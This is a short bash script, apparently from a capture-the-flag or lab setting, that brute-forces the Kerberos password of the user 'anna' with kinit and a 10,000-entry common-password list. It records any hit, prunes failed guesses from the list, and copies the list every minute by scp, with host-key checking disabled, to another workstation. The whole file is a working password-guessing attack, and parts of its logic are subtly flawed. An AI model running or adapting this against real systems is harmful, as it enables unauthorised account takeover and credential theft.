#!/bin/bash

# Path to the file with the 10,000 most common passwords
password_list_path="./10k-most-common.txt"

# Username for which the password will be tested
username="anna"

# Function to test passwords
check_password() {
    local password="$1"
    echo "$password" | kinit "$username" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Successful login as '$username' with password '$password'"
        echo "$password" >> successful_passwords.txt
        exit 0
    else
        echo "Failed login as '$username' with password '$password'"
        sed -i "/$password/d" "$password_list_path"
    fi
}

# Read each password from the list and attempt to log in
while IFS= read -r password1 && IFS= read -r password2; do
    check_password "$password1" &
    check_password "$password2" &
    wait
done < "$password_list_path"

# Transfer the updated password list file via SCP every minute
while true; do
    scp -o StrictHostKeyChecking=no "$password_list_path" peter@workstation2.CHALLENGE-883AD57C-80E2-4F8F-92F4-E8C19D747341.SVC.CLUSTER.LOCAL:~/ 
    sleep 60
done
